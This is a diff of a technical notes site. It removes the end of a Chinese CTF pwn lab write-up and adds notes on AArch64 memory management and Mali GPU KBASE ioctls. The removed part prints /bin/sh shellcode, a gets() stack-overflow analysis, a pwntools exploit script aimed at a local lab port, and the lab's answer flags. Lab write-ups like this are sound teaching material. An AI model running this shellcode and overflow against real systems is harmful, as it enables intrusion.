-<a id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="p">{</span>
-<a id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">b</span><span class="p">;</span>
-<a id="__codelineno-2-9" name="__codelineno-2-9"></a><span class="p">}</span>
-<a id="__codelineno-2-10" name="__codelineno-2-10"></a>
-<a id="__codelineno-2-11" name="__codelineno-2-11"></a><span class="kt">int</span><span class="w"> </span><span class="nf">and</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">b</span><span class="p">)</span>
-<a id="__codelineno-2-12" name="__codelineno-2-12"></a><span class="p">{</span>
-<a id="__codelineno-2-13" name="__codelineno-2-13"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">b</span><span class="p">;</span>
-<a id="__codelineno-2-14" name="__codelineno-2-14"></a><span class="p">}</span>
-<a id="__codelineno-2-15" name="__codelineno-2-15"></a>
-<a id="__codelineno-2-16" name="__codelineno-2-16"></a><span class="kt">int</span><span class="w"> </span><span class="nf">or</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">b</span><span class="p">)</span>
-<a id="__codelineno-2-17" name="__codelineno-2-17"></a><span class="p">{</span>
-<a id="__codelineno-2-18" name="__codelineno-2-18"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">b</span><span class="p">;</span>
-<a id="__codelineno-2-19" name="__codelineno-2-19"></a><span class="p">}</span>
-<a id="__codelineno-2-20" name="__codelineno-2-20"></a>
-<a id="__codelineno-2-21" name="__codelineno-2-21"></a><span class="kt">int</span><span class="w"> </span><span class="nf">xor</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">b</span><span class="p">)</span>
-<a id="__codelineno-2-22" name="__codelineno-2-22"></a><span class="p">{</span>
-<a id="__codelineno-2-23" name="__codelineno-2-23"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">b</span><span class="p">;</span>
-<a id="__codelineno-2-24" name="__codelineno-2-24"></a><span class="p">}</span>
-</code></pre></div></td></tr></table></div>
-<p>用 <code>gcc -S -O2 cal.c</code>, <code>as cal.s -o cal.o</code> ,<code>file cal.o</code>生成.o文件，便可以用 <code>objdump -d &lt;file name&gt;|less</code>查看其汇编代码和机器码了：</p>
-<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-3-10">10</a></span>
-<span class="normal"><a href="#__codelineno-3-11">11</a></span>
-<span class="normal"><a href="#__codelineno-3-12">12</a></span>
-<span class="normal"><a href="#__codelineno-3-13">13</a></span>
-<span class="normal"><a href="#__codelineno-3-14">14</a></span>
-<span class="normal"><a href="#__codelineno-3-15">15</a></span>
-<span class="normal"><a href="#__codelineno-3-16">16</a></span>
-<span class="normal"><a href="#__codelineno-3-17">17</a></span>
-<span class="normal"><a href="#__codelineno-3-18">18</a></span>
-<span class="normal"><a href="#__codelineno-3-19">19</a></span>
-<span class="normal"><a href="#__codelineno-3-20">20</a></span>
-<span class="normal"><a href="#__codelineno-3-21">21</a></span>
-<span class="normal"><a href="#__codelineno-3-22">22</a></span>
-<span class="normal"><a href="#__codelineno-3-23">23</a></span>
-<span class="normal"><a href="#__codelineno-3-24">24</a></span>
-<span class="normal"><a href="#__codelineno-3-25">25</a></span>
-<span class="normal"><a href="#__codelineno-3-26">26</a></span>
-<span class="normal"><a href="#__codelineno-3-27">27</a></span>
-<span class="normal"><a href="#__codelineno-3-28">28</a></span>
-<span class="normal"><a href="#__codelineno-3-29">29</a></span>
-<span class="normal"><a href="#__codelineno-3-30">30</a></span>
-<span class="normal"><a href="#__codelineno-3-31">31</a></span>
-<span class="normal"><a href="#__codelineno-3-32">32</a></span>
-<span class="normal"><a href="#__codelineno-3-33">33</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a>0000000000000000 &lt;add&gt;:
-<a id="__codelineno-3-2" name="__codelineno-3-2"></a>   0:   f3 0f 1e fa             endbr64
-<a id="__codelineno-3-3" name="__codelineno-3-3"></a>   4:   8d 04 37                lea    (%rdi,%rsi,1),%eax
-<a id="__codelineno-3-4" name="__codelineno-3-4"></a>   7:   c3                      ret
-<a id="__codelineno-3-5" name="__codelineno-3-5"></a>   8:   0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
-<a id="__codelineno-3-6" name="__codelineno-3-6"></a>   f:   00
-<a id="__codelineno-3-7" name="__codelineno-3-7"></a>
-<a id="__codelineno-3-8" name="__codelineno-3-8"></a>0000000000000010 &lt;sub&gt;:
-<a id="__codelineno-3-9" name="__codelineno-3-9"></a>  10:   f3 0f 1e fa             endbr64
-<a id="__codelineno-3-10" name="__codelineno-3-10"></a>  14:   89 f8                   mov    %edi,%eax
-<a id="__codelineno-3-11" name="__codelineno-3-11"></a>  16:   29 f0                   sub    %esi,%eax
-<a id="__codelineno-3-12" name="__codelineno-3-12"></a>  18:   c3                      ret
-<a id="__codelineno-3-13" name="__codelineno-3-13"></a>  19:   0f 1f 80 00 00 00 00    nopl   0x0(%rax)
-<a id="__codelineno-3-14" name="__codelineno-3-14"></a>
-<a id="__codelineno-3-15" name="__codelineno-3-15"></a>0000000000000020 &lt;and&gt;:
-<a id="__codelineno-3-16" name="__codelineno-3-16"></a>  20:   f3 0f 1e fa             endbr64
-<a id="__codelineno-3-17" name="__codelineno-3-17"></a>  24:   89 f8                   mov    %edi,%eax
-<a id="__codelineno-3-18" name="__codelineno-3-18"></a>  26:   21 f0                   and    %esi,%eax
-<a id="__codelineno-3-19" name="__codelineno-3-19"></a>  28:   c3                      ret
-<a id="__codelineno-3-20" name="__codelineno-3-20"></a>  29:   0f 1f 80 00 00 00 00    nopl   0x0(%rax)
-<a id="__codelineno-3-21" name="__codelineno-3-21"></a>
-<a id="__codelineno-3-22" name="__codelineno-3-22"></a>0000000000000030 &lt;or&gt;:
-<a id="__codelineno-3-23" name="__codelineno-3-23"></a>  30:   f3 0f 1e fa             endbr64
-<a id="__codelineno-3-24" name="__codelineno-3-24"></a>  34:   89 f8                   mov    %edi,%eax
-<a id="__codelineno-3-25" name="__codelineno-3-25"></a>  36:   09 f0                   or     %esi,%eax
-<a id="__codelineno-3-26" name="__codelineno-3-26"></a>  38:   c3                      ret
-<a id="__codelineno-3-27" name="__codelineno-3-27"></a>  39:   0f 1f 80 00 00 00 00    nopl   0x0(%rax)
-<a id="__codelineno-3-28" name="__codelineno-3-28"></a>
-<a id="__codelineno-3-29" name="__codelineno-3-29"></a>0000000000000040 &lt;xor&gt;:
-<a id="__codelineno-3-30" name="__codelineno-3-30"></a>  40:   f3 0f 1e fa             endbr64
-<a id="__codelineno-3-31" name="__codelineno-3-31"></a>  44:   89 f8                   mov    %edi,%eax
-<a id="__codelineno-3-32" name="__codelineno-3-32"></a>  46:   31 f0                   xor    %esi,%eax
-<a id="__codelineno-3-33" name="__codelineno-3-33"></a>  48:   c3                      ret
-</code></pre></div></td></tr></table></div>
-<p>将这些指令分别传入程序：</p>
-<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
-<span class="normal"><a href="#__codelineno-4-2">2</a></span>
-<span class="normal"><a href="#__codelineno-4-3">3</a></span>
-<span class="normal"><a href="#__codelineno-4-4">4</a></span>
-<span class="normal"><a href="#__codelineno-4-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="n">add_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf3\x0f\x1e\xfa\x8d\x04\x37\xc3</span><span class="s2">"</span>
-<a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="n">sub_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf3\x0f\x1e\xfa\x89\xf8\x29\xf0\xc3</span><span class="s2">"</span>
-<a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="n">and_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf3\x0f\x1e\xfa\x89\xf8\x21\xf0\xc3</span><span class="s2">"</span>
-<a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="n">or_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf3\x0f\x1e\xfa\x89\xf8\x09\xf0\xc3</span><span class="s2">"</span>
-<a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="n">xor_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf3\x0f\x1e\xfa\x89\xf8\x31\xf0\xc3</span><span class="s2">"</span>
-</code></pre></div></td></tr></table></div>
-<p>最后得到：</p>
-<p><img alt="1720442195091" src="../image/PwnLab1/1720442195091.png"></p>
-<p>所以flag的第一部分为：AAA{SheL1c0de_T0</p>
-<p>正常按照程序流程走的话只能拿到第一部分的flag，既然程序给了我们执行任意代码的能力，就需要想办法调出shell来找到第二部分的flag了，为此需要使用shellcode，通过查询database找到了我们需要的shellcode：<code>shellcode=b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"</code></p>
-<p>传入程序调出shell，最后找到flag的第二部分：_9E7_All_F1ag5}</p>
-<p><img alt="1720442500125" src="../image/PwnLab1/1720442500125.png"></p>
-<p>完整的flag为：AAA{SheL1c0de_T0_9E7_All_F1ag5}</p>
-<h2 id="4-task-4">4. Task 4<a class="headerlink" href="#4-task-4" title="Permanent link">¶</a></h2>
-<p>检查.c文件的漏洞：</p>
-<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-5-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-5-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-5-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-5-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-5-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-5-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-5-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-5-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-5-10">10</a></span>
-<span class="normal"><a href="#__codelineno-5-11">11</a></span>
-<span class="normal"><a href="#__codelineno-5-12">12</a></span>
-<span class="normal"><a href="#__codelineno-5-13">13</a></span>
-<span class="normal"><a href="#__codelineno-5-14">14</a></span>
-<span class="normal"><a href="#__codelineno-5-15">15</a></span>
-<span class="normal"><a href="#__codelineno-5-16">16</a></span>
-<span class="normal"><a href="#__codelineno-5-17">17</a></span>
-<span class="normal"><a href="#__codelineno-5-18">18</a></span>
-<span class="normal"><a href="#__codelineno-5-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
-<a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="p">{</span>
-<a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="w">    </span><span class="n">prepare</span><span class="p">();</span><span class="w"> </span><span class="c1">// quite necessary</span>
-<a id="__codelineno-5-4" name="__codelineno-5-4"></a>
-<a id="__codelineno-5-5" name="__codelineno-5-5"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">rndval</span><span class="p">;</span>
-<a id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sysconf</span><span class="p">(</span><span class="n">_SC_PAGESIZE</span><span class="p">);</span>
-<a id="__codelineno-5-7" name="__codelineno-5-7"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">rndstr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getenv</span><span class="p">(</span><span class="n">RDNKEY</span><span class="p">);</span>
-<a id="__codelineno-5-8" name="__codelineno-5-8"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-<a id="__codelineno-5-9" name="__codelineno-5-9"></a>
-<a id="__codelineno-5-10" name="__codelineno-5-10"></a><span class="w">    </span><span class="n">sscanf</span><span class="p">(</span><span class="n">rndstr</span><span class="p">,</span><span class="w"> </span><span class="s">"%d"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rndval</span><span class="p">);</span>
-<a id="__codelineno-5-11" name="__codelineno-5-11"></a>
-<a id="__codelineno-5-12" name="__codelineno-5-12"></a><span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">map_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAP_ADDR</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">rndval</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">);</span>
-<a id="__codelineno-5-13" name="__codelineno-5-13"></a><span class="w">    </span><span class="n">mmap</span><span class="p">(</span><span class="n">map_addr</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="n">PROT_EXEC</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PROT_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PROT_WRITE</span><span class="p">,</span><span class="w"> </span><span class="n">MAP_PRIVATE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MAP_ANONYMOUS</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MAP_FIXED</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
-<a id="__codelineno-5-14" name="__codelineno-5-14"></a><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">"what's your name: "</span><span class="p">);</span>
-<a id="__codelineno-5-15" name="__codelineno-5-15"></a><span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">map_addr</span><span class="p">,</span><span class="w"> </span><span class="mi">64</span><span class="p">);</span>
-<a id="__codelineno-5-16" name="__codelineno-5-16"></a><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">"try to overflow me~"</span><span class="p">);</span>
-<a id="__codelineno-5-17" name="__codelineno-5-17"></a><span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-<a id="__codelineno-5-18" name="__codelineno-5-18"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
-<a id="__codelineno-5-19" name="__codelineno-5-19"></a><span class="p">}</span>
-</code></pre></div></td></tr></table></div>
-<p>从这里可以看出，read函数输入的数据是可以执行的（PROT_EXEC），我们可以把shellcode放到这里面，用后面的gets函数实现栈溢出攻击，将函数的返回地址改到map_addr，就能够使程序跳转到我们的shellcode。因此我们需要知道，shellcode的地址和需要覆盖的字节数。</p>
-<p>MAP_ADDR的宏定义为 <code>#define MAP_ADDR 0x20000</code>，经过 <code>uint64_t map_addr = MAP_ADDR + ((rndval % 8) * 0x1000);</code>转换后得到map_addr，也就是注入的shellcode的位置，然而rndval取决于服务器的环境变量取值，需要进行爆破，好在有取模的限制，我们最多只需要8次尝试。</p>
-<p>把可执行文件放入IDA查看其汇编代码：</p>
-<p><img alt="1720491723981" src="../image/PwnLab1/1720491723981.png"></p>
-<p>我们的目标是让函数回到retn语句，实现返回，调用gets前[rbp-40h]告诉了我们偏移量，而且在64位系统下还额外需要8字节的偏移量，最后使用的覆盖长度是 <code>0x40+8</code>。</p>
-<p>根据以上思路和之前查到的shellcode，可以完成以下攻击代码：</p>
-<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-6-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-6-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-6-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-6-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-6-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-6-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-6-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-6-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-6-10">10</a></span>
-<span class="normal"><a href="#__codelineno-6-11">11</a></span>
-<span class="normal"><a href="#__codelineno-6-12">12</a></span>
-<span class="normal"><a href="#__codelineno-6-13">13</a></span>
-<span class="normal"><a href="#__codelineno-6-14">14</a></span>
-<span class="normal"><a href="#__codelineno-6-15">15</a></span>
-<span class="normal"><a href="#__codelineno-6-16">16</a></span>
-<span class="normal"><a href="#__codelineno-6-17">17</a></span>
-<span class="normal"><a href="#__codelineno-6-18">18</a></span>
-<span class="normal"><a href="#__codelineno-6-19">19</a></span>
-<span class="normal"><a href="#__codelineno-6-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="c1"># 目标服务器地址和端口</span>
-<a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="n">target_address</span> <span class="o">=</span> <span class="s1">'127.0.0.1'</span>
-<a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="n">target_port</span> <span class="o">=</span> <span class="mi">51842</span>
-<a id="__codelineno-6-5" name="__codelineno-6-5"></a>
-<a id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="c1"># 连接到目标服务器</span>
-<a id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">target_address</span><span class="p">,</span> <span class="n">target_port</span><span class="p">)</span>
-<a id="__codelineno-6-8" name="__codelineno-6-8"></a>
-<a id="__codelineno-6-9" name="__codelineno-6-9"></a><span class="n">shellcode_addr</span><span class="o">=</span><span class="mh">0x20000</span> <span class="o">+</span><span class="mh">0x5000</span>
-<a id="__codelineno-6-10" name="__codelineno-6-10"></a>
-<a id="__codelineno-6-11" name="__codelineno-6-11"></a><span class="c1"># x86_64 Linux 打开shell的shellcode</span>
-<a id="__codelineno-6-12" name="__codelineno-6-12"></a><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05</span><span class="s2">"</span>
-<a id="__codelineno-6-13" name="__codelineno-6-13"></a><span class="c1"># 计算部分</span>
-<a id="__codelineno-6-14" name="__codelineno-6-14"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">'A'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>
-<a id="__codelineno-6-15" name="__codelineno-6-15"></a><span class="c1"># 发送shellcode到目标服务器</span>
-<a id="__codelineno-6-16" name="__codelineno-6-16"></a><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"what's your name: "</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
-<a id="__codelineno-6-17" name="__codelineno-6-17"></a><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"try to overflow me~"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
-<a id="__codelineno-6-18" name="__codelineno-6-18"></a>
-<a id="__codelineno-6-19" name="__codelineno-6-19"></a><span class="c1"># 切换到交互模式</span>
-<a id="__codelineno-6-20" name="__codelineno-6-20"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div></td></tr></table></div>
-<p>其中0x5000的偏移量是逐个遍历得到的。由此可以进入shell，并使用cat flag命令输出flag的内容：AAA{R37_t0_guEs5_shE1Lc0d3_poS}</p>
-<p><img alt="1720492256755" src="../image/PwnLab1/1720492256755.png"></p>
-<p>从而完成此题目：</p>
-<p><img alt="1720491280934" src="../image/PwnLab1/1720491280934.png"></p>
-<h2 id="5-bonus">5. Bonus<a class="headerlink" href="#5-bonus" title="Permanent link">¶</a></h2>
-<p>这道题目比前面的几题都简单，题目已经给出服务器的架构是x86的32位系统，而且还直接开放了代码的运行权限，所以直接把shellcode发送过去然后在对应路径找到flag即可。</p>
-<p><img alt="1721305293711" src="../image/PwnLab1/1721305293711.png"></p>
-<p>上图中的代码可以直接跳转到指定路径并输出flag的内容，即AAA{lgm_is_a_big_turtle_qq_qun_386796080}。</p></div>
+<div><h1 id="aarch64-memory-management">AArch64 memory management<a class="headerlink" href="#aarch64-memory-management" title="Permanent link">¶</a></h1>
+<p>内存管理描述了如何控制对系统中内存的访问。每次操作系统或应用程序访问内存时，硬件都会执行内存管理。内存管理是为应用程序动态分配内存区域的一种方法。</p>
+<p>应用程序处理器设计用于运行丰富的操作系统，如Linux，并支持虚拟内存系统。在处理器上执行的软件只能看到虚拟地址，处理器将其转换为物理地址。这些物理地址呈现给内存系统，并指向内存中的实际物理位置。</p>
+<h2 id="address-spaces">Address Spaces<a class="headerlink" href="#address-spaces" title="Permanent link">¶</a></h2>
+<p>虚拟内存可以控制呈现给应用程序的内存地址，便于沙盒化和安全性；虚拟内存还可以将碎片化内存以连续的方式呈现给应用程序；而且软件开发人员不需要担心物理内存。</p>
+<p>虚拟内存和物理内存之间的映射是通过页表完成的。有时需要两次页表映射才能从虚拟地址转换到物理地址。</p>
+<p>处理器的安全状态决定了虚拟地址能够映射到的物理地址类型，分别有非安全状态、安全状态、域状态和根状态（最高权限状态），只能向该状态及以下的内存地址进行映射，其中根状态能够映射到任意物理地址空间。</p>
+<p>64位架构系统的内存地址自然也是64位的。</p>
+<p>内核空间和应用空间（用户空间）有着不同的转换表，这意味着两个空间的映射是分开存储的。</p>
+<p>地址空间的每个区域的大小最多为55位，也可以独立地缩小到更小的尺寸。</p>
+<p>不同的处理器对物理地址位数的支持不尽相同。</p>
+<p>内核映射是全局转换，而应用程序映射是非全局转换。全局转换适用于当前正在运行的任何应用程序。非全局转换仅适用于特定的应用程序。</p>
+<p>非全局映射在TLB中使用ASID标记。在进行TLB查找时，将TLB表项中的ASID与当前选择的ASID进行比较。如果它们不匹配，则不使用TLB项。</p>
+<p>不同程序可能有相同的虚拟地址。允许多个应用程序的TLB项在缓存中共存，由ASID决定使用哪个项。</p>
+<p>EL0/EL1转换也可以用虚拟机标识符（VMID）标记。vmid允许来自不同vm的转换在缓存中共存。这类似于asid处理来自不同应用程序的转换的方式。在实践中，这意味着一些转换将被标记为VMID和ASID，并且两者必须匹配才能使用TLB条目。（EL0和EL1是处理器的不同异常级别）</p>
+<p>多处理器的ASID和VMID并不能保证能够互用，这意味着一个处理器创建的TLB项不能保证可以被另一个处理器使用。但实际上ASID大多能在多处理器上保持一致，所以TLB也是多处理器通用的。</p>
+<h2 id="mmu">MMU<a class="headerlink" href="#mmu" title="Permanent link">¶</a></h2>
+<p>内存管理单元包含TLB和Table Walk Unit（页表遍历模块）。</p>
+<p>MMU先从TLB里找地址转换项，找不到就用TWU遍历页表来找。</p>
+<p><img alt="1745239559184" src="../image/mali/1745239559184.png"></p>
+<p>转换表的工作原理是将虚拟地址空间划分为大小相等的块，并在每个块中提供一个表项。（和体系结构差不多，不写了）</p>
+<p><img alt="1745239836272" src="../image/mali/1745239836272.png"></p>
+<p>如果禁用MMU，那么输入与地址和输出地址便会相同。</p>
+<h3 id="main-kbase-ioctls-kbase_ioctl_type-0x80">Main KBASE IOCTLs (<code>KBASE_IOCTL_TYPE 0x80</code>)<a class="headerlink" href="#main-kbase-ioctls-kbase_ioctl_type-0x80" title="Permanent link">¶</a></h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Macro Name</th>
+<th style="text-align: left;">Cmd Nr</th>
+<th style="text-align: left;">Direction</th>
+<th style="text-align: left;">Data Structure/Union</th>
+<th style="text-align: left;">Description</th>
+<th style="text-align: left;">Key Members (Input <code>in</code>/Output <code>out</code>)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_VERSION_CHECK</code></td>
+<td style="text-align: left;">0</td>
+<td style="text-align: left;">R/W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_version_check</code></td>
+<td style="text-align: left;">Checks version compatibility between userspace and kernel driver.</td>
+<td style="text-align: left;"><code>in/out</code>: <code>major</code> (<code>__u16</code>), <code>minor</code> (<code>__u16</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_SET_FLAGS</code></td>
+<td style="text-align: left;">1</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_set_flags</code></td>
+<td style="text-align: left;">Sets kernel context creation flags.</td>
+<td style="text-align: left;"><code>in</code>: <code>create_flags</code> (<code>__u32</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_GET_GPUPROPS</code></td>
+<td style="text-align: left;">3</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_get_gpuprops</code></td>
+<td style="text-align: left;">Reads GPU properties into a user-provided buffer. Returns bytes needed if <code>size</code> is 0, bytes written otherwise.</td>
+<td style="text-align: left;"><code>in</code>: <code>buffer</code> (<code>__u64</code>), <code>size</code> (<code>__u32</code>), <code>flags</code> (<code>__u32</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_ALLOC</code></td>
+<td style="text-align: left;">5</td>
+<td style="text-align: left;">R/W</td>
+<td style="text-align: left;"><code>union kbase_ioctl_mem_alloc</code></td>
+<td style="text-align: left;">Allocates GPU virtual and optionally physical memory.</td>
+<td style="text-align: left;"><code>in</code>: <code>va_pages</code>, <code>commit_pages</code>, <code>extent</code>, <code>flags</code> (all <code>__u64</code>) <code>&lt;br&gt;</code> <code>out</code>: <code>flags</code>, <code>gpu_va</code> (all <code>__u64</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_QUERY</code></td>
+<td style="text-align: left;">6</td>
+<td style="text-align: left;">R/W</td>
+<td style="text-align: left;"><code>union kbase_ioctl_mem_query</code></td>
+<td style="text-align: left;">Queries properties (commit size, VA size, flags) of a GPU memory region.</td>
+<td style="text-align: left;"><code>in</code>: <code>gpu_addr</code>, <code>query</code> (both <code>__u64</code>) <code>&lt;br&gt;</code> <code>out</code>: <code>value</code> (<code>__u64</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_FREE</code></td>
+<td style="text-align: left;">7</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_mem_free</code></td>
+<td style="text-align: left;">Frees a GPU memory region allocated via <code>MEM_ALLOC</code>.</td>
+<td style="text-align: left;"><code>in</code>: <code>gpu_addr</code> (<code>__u64</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_HWCNT_READER_SETUP</code></td>
+<td style="text-align: left;">8</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_hwcnt_reader_setup</code></td>
